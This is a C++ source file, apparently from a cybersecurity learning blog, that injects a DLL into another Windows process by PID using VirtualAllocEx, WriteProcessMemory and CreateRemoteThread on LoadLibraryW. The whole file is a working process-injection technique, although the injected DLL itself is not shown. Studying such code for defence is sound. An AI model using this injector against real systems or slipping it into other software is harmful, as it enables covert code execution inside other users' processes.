#include <iostream>
#include <windows.h>
#include <string>

using namespace std;

string gf = "^^ ";

static bool check(string str, bool cond, bool code = true)
{
	if (!cond)
	{
		cout << gf << str;
		if (code)
		{
			cout << " fail wt code " << GetLastError();
		}
		else
		{
			cout << " OK";
		}
	}
	else
	{
		cout << str << " suceed";
	}
	cout << endl;
	return cond;
}

int main(int argc, char* argv[]) {
	int ret = EXIT_FAILURE;

	DWORD PID, TID = NULL;
	LPVOID rBuffer = NULL;
	HMODULE hKernel32 = NULL;	// handle to module
	HANDLE hProcess, hThread = NULL;

	wchar_t dllPath[MAX_PATH] = L"C:\\Users\\elena\\Desktop\\Blog\\Skillup_cyber\\VS\\DLL_injection\\x64\\Debug\\DLL.dll";
	size_t dllPathSize = sizeof(dllPath);

	/// SECOND PARAMETER EXIST
	if (check("param", argc > 1, false))
	{
		/// TRY OPEN PROCESS
		PID = atoi(argv[1]);
		hProcess = OpenProcess((PROCESS_VM_OPERATION | PROCESS_VM_WRITE), FALSE, PID);
		if (check("open process with ID=" + to_string(PID), hProcess != NULL))
		{
			/// GET KERNEL32
			hKernel32 = GetModuleHandleW(L"kernel32");
			if (check("load kernel32", hKernel32 != NULL))
			{
				/// GET LoadLibraryW ADDRESS
				size_t load_library_addr = (size_t)GetProcAddress(hKernel32, "LoadLibraryW");
				LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)load_library_addr;

				/// ALLOCATE VIRTUAL MEM
				rBuffer = VirtualAllocEx(hProcess, NULL, dllPathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
				if (check("alloc virtual mem", rBuffer != NULL))
				{
					/// WRITE DLL
					if (check("write dll raw",
						(WriteProcessMemory(hProcess, rBuffer, dllPath, dllPathSize, NULL) != NULL)))
					{
						/// CREATE THREAD FROM LoadLibraryW address using written DLL onto virtual memory.
						hThread = CreateRemoteThread(hProcess, NULL, 0, startThis, rBuffer, 0, &TID);
						if (check("create thread", hThread != NULL))
						{
							cout << gf << "Load library from kernel32 at 0x" << hex << load_library_addr << endl;
							cout << gf << "DLL loading thread with ID=" << TID << endl;
							WaitForSingleObject(hThread, INFINITE);
							cout << gf << "DLL injected" << endl;

							CloseHandle(hThread);
						}
					}
				}
			}
			CloseHandle(hProcess);
		}
	}
	return ret;
}